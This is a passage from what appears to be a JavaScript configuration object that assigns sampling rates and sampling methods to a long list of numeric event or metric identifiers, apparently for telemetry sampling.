                        "3735598": {sampleRate: 100, samplingMethod: 1},
                        "3735599": {sampleRate: 1000, samplingMethod: 1},
                        "3735600": {sampleRate: 100, samplingMethod: 1},
                        "3735601": {sampleRate: 100, samplingMethod: 1},
                        "3735602": {sampleRate: 10000, samplingMethod: 1},
                        "3735603": {sampleRate: 10000, samplingMethod: 1},
                        "3735604": {sampleRate: 100, samplingMethod: 1},
                        "3735605": {sampleRate: 100, samplingMethod: 1},
                        "3735606": {sampleRate: 1, samplingMethod: 1},
                        "3735608": {sampleRate: 250, samplingMethod: 1},
                        "3735609": {sampleRate: 250, samplingMethod: 1},
                        "3735610": {sampleRate: 250, samplingMethod: 1},
                        "3735611": {sampleRate: 250, samplingMethod: 1},
                        "3735612": {sampleRate: 250, samplingMethod: 1},
                        "3735613": {sampleRate: 250, samplingMethod: 1},
                        "3735614": {sampleRate: 250, samplingMethod: 1},
                        "3735615": {sampleRate: 250, samplingMethod: 1},
                        "3735616": {sampleRate: 250, samplingMethod: 1},
                        "3735617": {sampleRate: 250, samplingMethod: 1},
                        "3735618": {sampleRate: 50, samplingMethod: 1},
                        "3735619": {sampleRate: 50, samplingMethod: 1},
                        "3735620": {sampleRate: 50, samplingMethod: 1},
                        "3735622": {sampleRate: 50, samplingMethod: 1},
                        "3735623": {sampleRate: 500, samplingMethod: 1},
                        "3735624": {sampleRate: 500, samplingMethod: 1},
                        "3735625": {sampleRate: 1, samplingMethod: 1},
                        "3735626": {sampleRate: 50, samplingMethod: 1},
                        "3735627": {sampleRate: 50, samplingMethod: 1},
                        "3735628": {sampleRate: 250, samplingMethod: 1},
                        "7077894": {sampleRate: 1, samplingMethod: 1},
                        "7079140": {sampleRate: 1, samplingMethod: 1},
                        "7079214": {sampleRate: 100, samplingMethod: 1},
                        "7079522": {sampleRate: 100, samplingMethod: 1},
                        "7079632": {sampleRate: 1, samplingMethod: 1},
                        "7079838": {sampleRate: 1, samplingMethod: 1},
                        "7079895": {sampleRate: 1, samplingMethod: 1},
                        "7079940": {sampleRate: 1, samplingMethod: 1},
                        "7080944": {sampleRate: 100, samplingMethod: 1},
                        "7081379": {sampleRate: 100, samplingMethod: 1},
                        "7081993": {sampleRate: 1, samplingMethod: 1},
                        "7081995": {sampleRate: 1, samplingMethod: 1},
                        "7082695": {sampleRate: 100, samplingMethod: 1},
                        "7083043": {sampleRate: 100, samplingMethod: 1},
                        "7083437": {sampleRate: 100, samplingMethod: 1},
                        "7083693": {sampleRate: 100, samplingMethod: 1},
                        "7083971": {sampleRate: 1, samplingMethod: 1},
                        "7084033": {sampleRate: 100, samplingMethod: 1},
                        "7084185": {sampleRate: 100, samplingMethod: 1},
                        "7084444": {sampleRate: 1, samplingMethod: 1},
                        "7084665": {sampleRate: 100, samplingMethod: 1},
                        "7084786": {sampleRate: 1, samplingMethod: 1},
                        "7085174": {sampleRate: 100, samplingMethod: 1},
                        "7085268": {sampleRate: 100, samplingMethod: 1},
                        "7086190": {sampleRate: 100, samplingMethod: 1},
                        "7086630": {sampleRate: 100, samplingMethod: 1},
                        "7087889": {sampleRate: 1, samplingMethod: 1},
                        "7088719": {sampleRate: 1, samplingMethod: 1},
                        "7088916": {sampleRate: 1, samplingMethod: 1},
                        "7088929": {sampleRate: 1, samplingMethod: 1},
                        "7088932": {sampleRate: 1, samplingMethod: 1},
                        "7088956": {sampleRate: 1, samplingMethod: 1},
                        "7089119": {sampleRate: 1, samplingMethod: 1},
                        "7089521": {sampleRate: 100, samplingMethod: 1},
                        "7089869": {sampleRate: 100, samplingMethod: 1},
                        "7090129": {sampleRate: 1, samplingMethod: 1},
                        "7090251": {sampleRate: 100, samplingMethod: 1},
                        "7091307": {sampleRate: 1, samplingMethod: 1},
                        "7092490": {sampleRate: 1, samplingMethod: 1},
                        "7092499": {sampleRate: 100, samplingMethod: 1},
                        "7092951": {sampleRate: 1, samplingMethod: 1},
                        "7093080": {sampleRate: 100, samplingMethod: 1},
                        "7093431": {sampleRate: 100, samplingMethod: 1},
                        "7093497": {sampleRate: 100, samplingMethod: 1},
                        "7093594": {sampleRate: 100, samplingMethod: 1},
                        "7093622": {sampleRate: 1, samplingMethod: 1},
                        "7093901": {sampleRate: 1, samplingMethod: 1},
                        "7094174": {sampleRate: 100, samplingMethod: 1},
                        "7733271": {sampleRate: 1, samplingMethod: 1},
                        "7736691": {sampleRate: 100, samplingMethod: 1},
                        "7742652": {sampleRate: 1, samplingMethod: 3},
                        "7747170": {sampleRate: 100, samplingMethod: 1},
                        "7747339": {sampleRate: 100, samplingMethod: 1},
                        "7749497": {sampleRate: 1, samplingMethod: 1},
                        "7995400": {sampleRate: 1, samplingMethod: 1},
                        "7995408": {sampleRate: 100, samplingMethod: 1},
                        "11075649": {sampleRate: 1, samplingMethod: 1},
                        "11075654": {sampleRate: 1, samplingMethod: 1},
                        "11075674": {sampleRate: 1, samplingMethod: 1},
                        "11084341": {sampleRate: 1, samplingMethod: 1},
                        "12451850": {sampleRate: 1, samplingMethod: 1},
                        "12451854": {sampleRate: 1, samplingMethod: 3},
                        "12451859": {sampleRate: 1, samplingMethod: 3},
                        "12451868": {sampleRate: 1, samplingMethod: 1},
                        "12451869": {sampleRate: 1, samplingMethod: 1},
                        "12451873": {sampleRate: 10000, samplingMethod: 1},
                        "12453291": {sampleRate: 1, samplingMethod: 1},
                        "12454042": {sampleRate: 10000, samplingMethod: 1},
                        "12454789": {sampleRate: 10000, samplingMethod: 1},
                        "12457892": {sampleRate: 10000, samplingMethod: 1},
                        "12457943": {sampleRate: 10000, samplingMethod: 1},
                        "12458187": {sampleRate: 10000, samplingMethod: 1},
                        "12462244": {sampleRate: 10000, samplingMethod: 1},
                        "12463624": {sampleRate: 1, samplingMethod: 1},
                        "12464511": {sampleRate: 10000, samplingMethod: 1},
                        "12466919": {sampleRate: 10000, samplingMethod: 1},
                        "12859882": {sampleRate: 10000, samplingMethod: 1},
                        "13238313": {sampleRate: 100, samplingMethod: 1},
                        "13238314": {sampleRate: 100, samplingMethod: 1},
                        "13238353": {sampleRate: 100, samplingMethod: 1},
                        "13238354": {sampleRate: 100, samplingMethod: 1},
                        "13238355": {sampleRate: 100, samplingMethod: 1},
                        "13238356": {sampleRate: 100, samplingMethod: 1},
                        "13238392": {sampleRate: 100, samplingMethod: 1},
                        "13238398": {sampleRate: 100, samplingMethod: 1},
                        "13238399": {sampleRate: 100, samplingMethod: 1},
                        "13238400": {sampleRate: 100, samplingMethod: 1},
                        "13249850": {sampleRate: 100, samplingMethod: 1},
                        "13250512": {sampleRate: 100, samplingMethod: 1},
                        "13252469": {sampleRate: 100, samplingMethod: 1},
                        "17825794": {sampleRate: 250, samplingMethod: 1},
                        "19146195": {sampleRate: 10000, samplingMethod: 1},
                        "19146604": {sampleRate: 1, samplingMethod: 1},
                        "19152862": {sampleRate: 5, samplingMethod: 1},
                        "19216409": {sampleRate: 100, samplingMethod: 1},
                        "20578320": {sampleRate: 1000000, samplingMethod: 1},
                        "22347782": {sampleRate: 100, samplingMethod: 1},
                        "22609921": {sampleRate: 10000, samplingMethod: 1},
                        "22675460": {sampleRate: 250, samplingMethod: 1},
                        "23265284": {sampleRate: 1, samplingMethod: 3},
                        "23265285": {sampleRate: 1, samplingMethod: 3},
                        "23265286": {sampleRate: 1, samplingMethod: 3},
                        "23281892": {sampleRate: 1, samplingMethod: 1},
                        "23285466": {sampleRate: 1, samplingMethod: 1},
                        "23461896": {sampleRate: 1, samplingMethod: 1},
                        "23461898": {sampleRate: 1, samplingMethod: 1},
                        "23461899": {sampleRate: 10000, samplingMethod: 1},
                        "23461900": {sampleRate: 1, samplingMethod: 1},
                        "23461901": {sampleRate: 1, samplingMethod: 1},
                        "23461902": {sampleRate: 1, samplingMethod: 1},
                        "23473227": {sampleRate: 1, samplingMethod: 1},
                        "23476559": {sampleRate: 1, samplingMethod: 1},
                        "23491362": {sampleRate: 1, samplingMethod: 1},
                        "23855114": {sampleRate: 1, samplingMethod: 1},
                        "24122239": {sampleRate: 1, samplingMethod: 1},
                        "24130366": {sampleRate: 10, samplingMethod: 1},
                        "25296897": {sampleRate: 1, samplingMethod: 1},
                        "25296900": {sampleRate: 1000, samplingMethod: 1},
                        "25296901": {sampleRate: 1, samplingMethod: 1},
                        "25296902": {sampleRate: 1, samplingMethod: 1},
                        "25296903": {sampleRate: 1000, samplingMethod: 1},
                        "25296904": {sampleRate: 1000, samplingMethod: 1},
                        "25296905": {sampleRate: 1000, samplingMethod: 1},
                        "25296906": {sampleRate: 1000, samplingMethod: 1},
                        "25298086": {sampleRate: 1, samplingMethod: 1},
                        "25304023": {sampleRate: 1000, samplingMethod: 1},
                        "25305590": {sampleRate: 1000, samplingMethod: 1},
                        "25310776": {sampleRate: 1000, samplingMethod: 1},
                        "26869761": {sampleRate: 1, samplingMethod: 1},
                        "26869762": {sampleRate: 1, samplingMethod: 1},
                        "26869763": {sampleRate: 1, samplingMethod: 1},
                        "26869764": {sampleRate: 1, samplingMethod: 1},
                        "26869766": {sampleRate: 1, samplingMethod: 1},
                        "26869768": {sampleRate: 1, samplingMethod: 1},
                        "26869770": {sampleRate: 1, samplingMethod: 1},
                        "26869771": {sampleRate: 1, samplingMethod: 1},
                        "26877377": {sampleRate: 1, samplingMethod: 1},
                        "26878862": {sampleRate: 1, samplingMethod: 1},
                        "26880417": {sampleRate: 1, samplingMethod: 1},
                        "26881111": {sampleRate: 1, samplingMethod: 1},
                        "26882160": {sampleRate: 1, samplingMethod: 1},
                        "26883711": {sampleRate: 1, samplingMethod: 1},
                        "26885348": {sampleRate: 1, samplingMethod: 1},
                        "26898960": {sampleRate: 1, samplingMethod: 1},
                        "27459588": {sampleRate: 5000, samplingMethod: 1},
                        "27459589": {sampleRate: 1, samplingMethod: 1},
                        "27459590": {sampleRate: 10, samplingMethod: 1},
                        "27459591": {sampleRate: 1, samplingMethod: 1},
                        "27467867": {sampleRate: 1000, samplingMethod: 1},
                        "27475950": {sampleRate: 1000, samplingMethod: 1},
                        "27787270": {sampleRate: 1000000, samplingMethod: 1},
                        "27787271": {sampleRate: 10000, samplingMethod: 1},
                        "27797599": {sampleRate: 1, samplingMethod: 1},
                        "27983873": {sampleRate: 1, samplingMethod: 1},
                        "27983874": {sampleRate: 1, samplingMethod: 1},
                        "27983875": {sampleRate: 1, samplingMethod: 1},
                        "27983876": {sampleRate: 1, samplingMethod: 1},
                        "27983877": {sampleRate: 1, samplingMethod: 1},
                        "29047276": {sampleRate: 10000, samplingMethod: 1},
                        "29818881": {sampleRate: 1, samplingMethod: 1},
                        "29818882": {sampleRate: 1, samplingMethod: 1},
                        "29818883": {sampleRate: 1, samplingMethod: 1},
                        "29818884": {sampleRate: 1, samplingMethod: 1},
                        "29949953": {sampleRate: 1, samplingMethod: 1},
                        "29949955": {sampleRate: 1, samplingMethod: 1},
                        "30408705": {sampleRate: 1, samplingMethod: 1},
                        "30408706": {sampleRate: 1, samplingMethod: 1},
                        "30408707": {sampleRate: 1, samplingMethod: 1},
                        "30408708": {sampleRate: 1, samplingMethod: 1},
                        "30408709": {sampleRate: 1, samplingMethod: 1},
                        "30408710": {sampleRate: 1, samplingMethod: 1},
                        "30408711": {sampleRate: 1, samplingMethod: 1},
                        "30408712": {sampleRate: 1, samplingMethod: 1},
                        "30421153": {sampleRate: 1, samplingMethod: 1},
                        "30605313": {sampleRate: 100, samplingMethod: 1},
                        "30605314": {sampleRate: 100, samplingMethod: 1},
                        "30605315": {sampleRate: 100, samplingMethod: 1},
                        "30605316": {sampleRate: 1, samplingMethod: 1},
                        "30605317": {sampleRate: 1, samplingMethod: 1},
                        "30605319": {sampleRate: 1, samplingMethod: 1},
                        "30605320": {sampleRate: 1, samplingMethod: 1},
                        "30605321": {sampleRate: 1, samplingMethod: 1},
                        "30605322": {sampleRate: 1, samplingMethod: 1},
                        "30605323": {sampleRate: 1, samplingMethod: 1},
                        "30605324": {sampleRate: 1, samplingMethod: 1},
                        "30605325": {sampleRate: 1, samplingMethod: 1},
                        "30605326": {sampleRate: 1, samplingMethod: 1},
                        "30605328": {sampleRate: 1, samplingMethod: 1},
                        "30605329": {sampleRate: 1, samplingMethod: 1},
                        "30605330": {sampleRate: 1, samplingMethod: 1},
                        "30605331": {sampleRate: 1, samplingMethod: 1},
                        "30605333": {sampleRate: 1, samplingMethod: 1},
                        "30605334": {sampleRate: 1, samplingMethod: 1},
                        "30605335": {sampleRate: 1, samplingMethod: 1},
                        "30605336": {sampleRate: 1, samplingMethod: 1},
                        "30605337": {sampleRate: 1, samplingMethod: 1},
                        "30605338": {sampleRate: 1, samplingMethod: 1},
                        "30605339": {sampleRate: 1, samplingMethod: 1},
                        "30605340": {sampleRate: 1, samplingMethod: 1},
                        "30605341": {sampleRate: 1, samplingMethod: 1},
                        "30605342": {sampleRate: 1, samplingMethod: 1},
                        "30605343": {sampleRate: 1, samplingMethod: 1},
                        "30605344": {sampleRate: 1, samplingMethod: 1},
                        "30605345": {sampleRate: 1, samplingMethod: 1},
                        "30605346": {sampleRate: 1, samplingMethod: 1},
                        "30605347": {sampleRate: 1, samplingMethod: 1},
                        "30605348": {sampleRate: 1, samplingMethod: 1},
                        "30605349": {sampleRate: 1, samplingMethod: 1},
                        "30605350": {sampleRate: 1, samplingMethod: 1},
                        "30605351": {sampleRate: 1, samplingMethod: 1},
                        "30605352": {sampleRate: 1, samplingMethod: 1},
                        "30605353": {sampleRate: 1, samplingMethod: 1},
                        "30605354": {sampleRate: 1, samplingMethod: 1},
                        "30605355": {sampleRate: 1, samplingMethod: 1},
                        "30605356": {sampleRate: 1, samplingMethod: 1},
                        "30605357": {sampleRate: 1, samplingMethod: 1},
                        "30605358": {sampleRate: 1, samplingMethod: 1},
                        "30605360": {sampleRate: 1, samplingMethod: 1},
                        "30605361": {sampleRate: 1, samplingMethod: 1},
                        "30605362": {sampleRate: 1, samplingMethod: 1},
                        "30605363": {sampleRate: 1, samplingMethod: 1},
                        "30605364": {sampleRate: 1, samplingMethod: 1},
                        "30605366": {sampleRate: 1, samplingMethod: 1},
                        "30605367": {sampleRate: 1, samplingMethod: 1},
                        "30605368": {sampleRate: 1, samplingMethod: 1},
                        "30605369": {sampleRate: 1, samplingMethod: 1},
                        "30605370": {sampleRate: 1, samplingMethod: 1},
                        "30605371": {sampleRate: 1, samplingMethod: 1},
                        "30605373": {sampleRate: 1, samplingMethod: 1},
                        "30605374": {sampleRate: 1, samplingMethod: 1},
                        "30605375": {sampleRate: 1, samplingMethod: 1},
                        "30605376": {sampleRate: 1, samplingMethod: 1},
                        "30605378": {sampleRate: 1, samplingMethod: 1},
                        "30605380": {sampleRate: 1, samplingMethod: 1},
                        "30605381": {sampleRate: 1, samplingMethod: 1},
                        "30605382": {sampleRate: 1, samplingMethod: 1},
                        "30605384": {sampleRate: 1, samplingMethod: 1},
                        "30605386": {sampleRate: 1, samplingMethod: 1},
                        "30605387": {sampleRate: 1, samplingMethod: 1},
                        "30605389": {sampleRate: 1, samplingMethod: 1},
                        "30605390": {sampleRate: 1, samplingMethod: 1},
                        "30605391": {sampleRate: 1, samplingMethod: 1},
                        "30605392": {sampleRate: 1, samplingMethod: 1},
                        "30605393": {sampleRate: 1, samplingMethod: 1},
                        "30615365": {sampleRate: 1, samplingMethod: 1},
                        "30615438": {sampleRate: 1, samplingMethod: 1},
                        "30616610": {sampleRate: 1, samplingMethod: 1},
                        "30617968": {sampleRate: 1, samplingMethod: 1},
                        "30618398": {sampleRate: 1, samplingMethod: 1},
                        "30618615": {sampleRate: 1, samplingMethod: 1},
                        "30620813": {sampleRate: 1, samplingMethod: 1},
                        "30621572": {sampleRate: 1, samplingMethod: 1},
                        "30632331": {sampleRate: 1, samplingMethod: 1},
                        "32312156": {sampleRate: 1, samplingMethod: 1},
                        "32374785": {sampleRate: 10000, samplingMethod: 1},
                        "32702465": {sampleRate: 1, samplingMethod: 1},
                        "33488897": {sampleRate: 1, samplingMethod: 1},
                        "33488898": {sampleRate: 1, samplingMethod: 1},
                        "33488900": {sampleRate: 1, samplingMethod: 1},
                        "33488901": {sampleRate: 1800, samplingMethod: 1},
                        "33488902": {sampleRate: 1, samplingMethod: 1},
                        "33488903": {sampleRate: 1, samplingMethod: 1},
                        "33488904": {sampleRate: 1, samplingMethod: 1},
                        "33488905": {sampleRate: 1, samplingMethod: 1},
                        "33494245": {sampleRate: 1, samplingMethod: 1},
                        "33619969": {sampleRate: 1, samplingMethod: 1},
                        "34156514": {sampleRate: 1, samplingMethod: 1},
                        "35586051": {sampleRate: 10, samplingMethod: 1},
                        "35586052": {sampleRate: 1000, samplingMethod: 1},
                        "35586053": {sampleRate: 1000, samplingMethod: 1},
                        "36110337": {sampleRate: 1, samplingMethod: 1},
                        "36110338": {sampleRate: 1, samplingMethod: 1},
                        "36110339": {sampleRate: 1, samplingMethod: 1},
                        "36241413": {sampleRate: 1, samplingMethod: 1},
                        "36241422": {sampleRate: 1, samplingMethod: 1},
                        "36241423": {sampleRate: 1, samplingMethod: 1},
                        "36241434": {sampleRate: 1, samplingMethod: 1},
                        "36243184": {sampleRate: 1, samplingMethod: 1},
                        "36244063": {sampleRate: 1, samplingMethod: 1},
                        "36246584": {sampleRate: 1, samplingMethod: 1},
                        "36247076": {sampleRate: 1, samplingMethod: 1},
                        "36247834": {sampleRate: 1, samplingMethod: 1},
                        "36249481": {sampleRate: 1, samplingMethod: 1},
                        "36250226": {sampleRate: 1, samplingMethod: 1},
                        "36251818": {sampleRate: 1, samplingMethod: 1},
                        "36255283": {sampleRate: 1, samplingMethod: 1},
                        "36256069": {sampleRate: 1, samplingMethod: 1},
                        "36257380": {sampleRate: 1, samplingMethod: 1},
                        "36306945": {sampleRate: 1, samplingMethod: 1},
                        "36306946": {sampleRate: 1, samplingMethod: 1},
                        "36306948": {sampleRate: 1, samplingMethod: 1},
                        "36306951": {sampleRate: 1000, samplingMethod: 1},
                        "36306952": {sampleRate: 1, samplingMethod: 1},
                        "36306955": {sampleRate: 1, samplingMethod: 1},
                        "36306958": {sampleRate: 1, samplingMethod: 1},
                        "37101248": {sampleRate: 10000, samplingMethod: 1},
                        "37158913": {sampleRate: 1, samplingMethod: 1},
                        "37158914": {sampleRate: 1, samplingMethod: 1},
                        "37158915": {sampleRate: 1, samplingMethod: 1},
                        "37158916": {sampleRate: 1, samplingMethod: 1},
                        "37224449": {sampleRate: 10000, samplingMethod: 1},
                        "37224450": {sampleRate: 10000, samplingMethod: 1},
                        "37224451": {sampleRate: 10000, samplingMethod: 1},
                        "37224452": {sampleRate: 10000, samplingMethod: 1},
                        "37224453": {sampleRate: 10000, samplingMethod: 1},
                        "37224454": {sampleRate: 10000, samplingMethod: 1},
                        "37224455": {sampleRate: 10000, samplingMethod: 1},
                        "37224456": {sampleRate: 10000, samplingMethod: 1},
                        "37224457": {sampleRate: 10000, samplingMethod: 1},
                        "37289985": {sampleRate: 1, samplingMethod: 1},
                        "37289986": {sampleRate: 1, samplingMethod: 1},
                        "37289987": {sampleRate: 1, samplingMethod: 1},
                        "37289990": {sampleRate: 1, samplingMethod: 1},
                        "37289991": {sampleRate: 1, samplingMethod: 1},
                        "37289992": {sampleRate: 1, samplingMethod: 1},
                        "37359568": {sampleRate: 10, samplingMethod: 1},
                        "37362344": {sampleRate: 10, samplingMethod: 1},
                        "37363365": {sampleRate: 10, samplingMethod: 1},
                        "37365445": {sampleRate: 10, samplingMethod: 1},
                        "37368014": {sampleRate: 10, samplingMethod: 1},
                        "37368588": {sampleRate: 10, samplingMethod: 1},
                        "37370103": {sampleRate: 10, samplingMethod: 1},
                        "37631558": {sampleRate: 4, samplingMethod: 1},
                        "37814273": {sampleRate: 1, samplingMethod: 1},
                        "37814274": {sampleRate: 1, samplingMethod: 1},
                        "37814275": {sampleRate: 1, samplingMethod: 1},
                        "38209779": {sampleRate: 100, samplingMethod: 1},
                        "38212112": {sampleRate: 100, samplingMethod: 1},
                        "38212473": {sampleRate: 100, samplingMethod: 1},
                        "38220042": {sampleRate: 100, samplingMethod: 1},
                        "38338561": {sampleRate: 1, samplingMethod: 1},
                        "38338562": {sampleRate: 1, samplingMethod: 1},
                        "38338563": {sampleRate: 1, samplingMethod: 1},
                        "38338564": {sampleRate: 1, samplingMethod: 1},
                        "38344892": {sampleRate: 1, samplingMethod: 1},
                        "38349246": {sampleRate: 1, samplingMethod: 1},
                        "38351883": {sampleRate: 1, samplingMethod: 1},
                        "38928385": {sampleRate: 1, samplingMethod: 1},
                        "39976964": {sampleRate: 2, samplingMethod: 1},
                        "39976965": {sampleRate: 2, samplingMethod: 1},
                        "39976966": {sampleRate: 1, samplingMethod: 1},
                        "39976967": {sampleRate: 2, samplingMethod: 1},
                        "40173575": {sampleRate: 1000, samplingMethod: 1},
                        "40501249": {sampleRate: 1, samplingMethod: 3},
                        "40501250": {sampleRate: 1, samplingMethod: 1},
                        "40501251": {sampleRate: 1, samplingMethod: 1},
                        "40501252": {sampleRate: 1, samplingMethod: 1},
                        "40501253": {sampleRate: 1, samplingMethod: 1},
                        "40501254": {sampleRate: 1, samplingMethod: 1},
                        "40501255": {sampleRate: 1, samplingMethod: 1},
                        "40840748": {sampleRate: 1, samplingMethod: 1},
                        "40841422": {sampleRate: 1, samplingMethod: 1},
                        "40843772": {sampleRate: 1, samplingMethod: 1},
                        "40894467": {sampleRate: 1, samplingMethod: 1},
                        "40894468": {sampleRate: 1, samplingMethod: 1},
                        "40894469": {sampleRate: 1, samplingMethod: 1},
                        "40894470": {sampleRate: 1, samplingMethod: 1},
                        "40894472": {sampleRate: 1, samplingMethod: 1},
                        "40894473": {sampleRate: 1, samplingMethod: 1},
                        "40894474": {sampleRate: 1, samplingMethod: 1},
                        "40894475": {sampleRate: 1, samplingMethod: 1},
                        "40894483": {sampleRate: 1, samplingMethod: 1},
                        "40894484": {sampleRate: 1, samplingMethod: 1},
                        "40894485": {sampleRate: 1, samplingMethod: 1},
                        "40894486": {sampleRate: 1, samplingMethod: 1},
                        "40894487": {sampleRate: 1, samplingMethod: 1},
                        "40894490": {sampleRate: 1, samplingMethod: 1},
                        "40894491": {sampleRate: 1, samplingMethod: 1},
                        "40894492": {sampleRate: 1, samplingMethod: 1},
                        "40894493": {sampleRate: 1, samplingMethod: 1},
                        "40894494": {sampleRate: 1, samplingMethod: 1},
                        "40894495": {sampleRate: 1, samplingMethod: 1},
                        "40894496": {sampleRate: 1, samplingMethod: 1},
                        "40894497": {sampleRate: 1, samplingMethod: 1},
                        "40894498": {sampleRate: 1, samplingMethod: 1},
                        "40894499": {sampleRate: 1, samplingMethod: 1},
                        "40894500": {sampleRate: 1, samplingMethod: 1},
                        "40894501": {sampleRate: 1, samplingMethod: 1},
                        "40894502": {sampleRate: 1, samplingMethod: 1},
                        "40903710": {sampleRate: 1, samplingMethod: 1},
                        "40905691": {sampleRate: 1, samplingMethod: 1},
                        "40908043": {sampleRate: 1, samplingMethod: 1},
                        "40910623": {sampleRate: 1, samplingMethod: 1},
                        "40913765": {sampleRate: 1, samplingMethod: 1},
                        "40919892": {sampleRate: 1, samplingMethod: 1},
                        "41484289": {sampleRate: 2, samplingMethod: 1},
                        "41484290": {sampleRate: 100, samplingMethod: 1},
                        "41484291": {sampleRate: 100, samplingMethod: 1},
                        "41484292": {sampleRate: 100, samplingMethod: 1},
                        "41484293": {sampleRate: 100, samplingMethod: 1},
                        "41484294": {sampleRate: 200, samplingMethod: 1},
                        "41484295": {sampleRate: 100, samplingMethod: 1},
                        "41484296": {sampleRate: 100, samplingMethod: 1},
                        "41484297": {sampleRate: 100, samplingMethod: 1},
                        "41484298": {sampleRate: 100, samplingMethod: 1},
                        "41484299": {sampleRate: 100, samplingMethod: 1},
                        "41484300": {sampleRate: 100, samplingMethod: 1},
                        "41484301": {sampleRate: 1, samplingMethod: 1},
                        "41484302": {sampleRate: 100, samplingMethod: 1},
                        "41484303": {sampleRate: 100, samplingMethod: 1},
                        "41484304": {sampleRate: 100, samplingMethod: 1},
                        "41484306": {sampleRate: 100, samplingMethod: 1},
                        "41484307": {sampleRate: 100, samplingMethod: 1},
                        "41484308": {sampleRate: 100, samplingMethod: 1},
                        "41484309": {sampleRate: 10, samplingMethod: 1},
                        "41484310": {sampleRate: 10, samplingMethod: 1},
                        "41484311": {sampleRate: 1, samplingMethod: 1},
                        "41484313": {sampleRate: 1, samplingMethod: 1},
                        "41484314": {sampleRate: 1, samplingMethod: 1},
                        "41484315": {sampleRate: 100, samplingMethod: 1},
                        "41484317": {sampleRate: 100, samplingMethod: 1},
                        "41484318": {sampleRate: 20, samplingMethod: 1},
                        "41485898": {sampleRate: 10, samplingMethod: 1},
                        "41486225": {sampleRate: 1, samplingMethod: 1},
                        "41486524": {sampleRate: 1, samplingMethod: 1},
                        "41487618": {sampleRate: 100, samplingMethod: 1},
                        "41488847": {sampleRate: 1, samplingMethod: 1},
                        "41490105": {sampleRate: 1, samplingMethod: 1},
                        "41490114": {sampleRate: 100, samplingMethod: 1},
                        "41490310": {sampleRate: 100, samplingMethod: 1},
                        "41491162": {sampleRate: 1, samplingMethod: 1},
                        "41491369": {sampleRate: 10, samplingMethod: 1},
                        "41491493": {sampleRate: 1, samplingMethod: 1},
                        "41491663": {sampleRate: 2, samplingMethod: 1},
                        "41491821": {sampleRate: 100, samplingMethod: 1},
                        "41492048": {sampleRate: 1, samplingMethod: 1},
                        "41492124": {sampleRate: 1, samplingMethod: 1},
                        "41492235": {sampleRate: 1, samplingMethod: 1},
                        "41493161": {sampleRate: 100, samplingMethod: 1},
                        "41493580": {sampleRate: 100, samplingMethod: 1},
                        "41494292": {sampleRate: 100, samplingMethod: 1},
                        "41495055": {sampleRate: 100, samplingMethod: 1},
                        "41495214": {sampleRate: 100, samplingMethod: 1},
                        "41495478": {sampleRate: 1, samplingMethod: 1},
                        "41495493": {sampleRate: 1, samplingMethod: 1},
                        "41495649": {sampleRate: 1, samplingMethod: 1},
                        "41497570": {sampleRate: 10, samplingMethod: 1},
                        "41497784": {sampleRate: 100, samplingMethod: 1},
                        "41498606": {sampleRate: 10, samplingMethod: 1},
                        "41499313": {sampleRate: 100, samplingMethod: 1},
                        "41500090": {sampleRate: 100, samplingMethod: 1},
                        "41500162": {sampleRate: 1, samplingMethod: 1},
                        "41506813": {sampleRate: 250, samplingMethod: 1},
                        "41549825": {sampleRate: 1, samplingMethod: 1},
                        "41811969": {sampleRate: 1, samplingMethod: 1},
                        "41811970": {sampleRate: 1, samplingMethod: 1},
                        "41811971": {sampleRate: 1, samplingMethod: 1},
                        "42403339": {sampleRate: 1, samplingMethod: 1},
                        "42406132": {sampleRate: 1, samplingMethod: 1},
                        "42408939": {sampleRate: 1, samplingMethod: 1},
                        "42411149": {sampleRate: 1, samplingMethod: 1},
                        "42417878": {sampleRate: 1, samplingMethod: 1},
                        "42532865": {sampleRate: 1000, samplingMethod: 1},
                        "42532866": {sampleRate: 10000, samplingMethod: 1},
                        "42729476": {sampleRate: 1, samplingMethod: 1},
                        "42729477": {sampleRate: 1, samplingMethod: 1},
                        "42729478": {sampleRate: 1, samplingMethod: 1},
                        "42738840": {sampleRate: 1, samplingMethod: 1},
                        "42795009": {sampleRate: 1, samplingMethod: 1},
                        "44040193": {sampleRate: 1, samplingMethod: 1},
                        "44040194": {sampleRate: 1, samplingMethod: 1},
                        "44040198": {sampleRate: 1, samplingMethod: 1},
                        "44433409": {sampleRate: 1, samplingMethod: 1},
                        "44433410": {sampleRate: 1, samplingMethod: 1},
                        "44433411": {sampleRate: 1, samplingMethod: 1},
                        "44892162": {sampleRate: 1, samplingMethod: 1},
                        "44892163": {sampleRate: 1, samplingMethod: 1},
                        "44892165": {sampleRate: 5, samplingMethod: 1},
                        "44892166": {sampleRate: 5, samplingMethod: 1},
                        "44957701": {sampleRate: 1, samplingMethod: 1},
                        "45088770": {sampleRate: 1, samplingMethod: 1},
                        "45613057": {sampleRate: 1, samplingMethod: 1},
                        "45613058": {sampleRate: 1, samplingMethod: 1},
                        "45613059": {sampleRate: 1, samplingMethod: 1},
                        "45678593": {sampleRate: 1, samplingMethod: 1},
                        "45678594": {sampleRate: 100, samplingMethod: 1},
                        "46596097": {sampleRate: 1, samplingMethod: 1},
                        "47841281": {sampleRate: 1, samplingMethod: 1},
                        "47841282": {sampleRate: 1, samplingMethod: 1},
                        "47841283": {sampleRate: 1, samplingMethod: 1},
                        "48496641": {sampleRate: 1, samplingMethod: 1},
                        "48758785": {sampleRate: 1, samplingMethod: 1},
                        "48758786": {sampleRate: 1, samplingMethod: 1},
                        "49283073": {sampleRate: 1, samplingMethod: 1},
                        "49283075": {sampleRate: 100, samplingMethod: 1},
                        "49284811": {sampleRate: 100, samplingMethod: 1},
                        "49285023": {sampleRate: 100, samplingMethod: 1},
                        "49287848": {sampleRate: 100, samplingMethod: 1},
                        "49290075": {sampleRate: 100, samplingMethod: 1},
                        "49290201": {sampleRate: 100, samplingMethod: 1},
                        "49290401": {sampleRate: 100, samplingMethod: 1},
                        "49290951": {sampleRate: 100, samplingMethod: 1},
                        "49291043": {sampleRate: 100, samplingMethod: 1},
                        "49291264": {sampleRate: 100, samplingMethod: 1},
                        "49294705": {sampleRate: 100, samplingMethod: 1},
                        "49294997": {sampleRate: 100, samplingMethod: 1},
                        "49295194": {sampleRate: 100, samplingMethod: 1},
                        "49296905": {sampleRate: 100, samplingMethod: 1},
                        "49298279": {sampleRate: 100, samplingMethod: 1},
                        "49479681": {sampleRate: 1, samplingMethod: 1},
                        "49479683": {sampleRate: 1, samplingMethod: 1},
                        "49479685": {sampleRate: 1, samplingMethod: 1},
                        "49481946": {sampleRate: 1, samplingMethod: 1},
                        "49816219": {sampleRate: 10000, samplingMethod: 1},
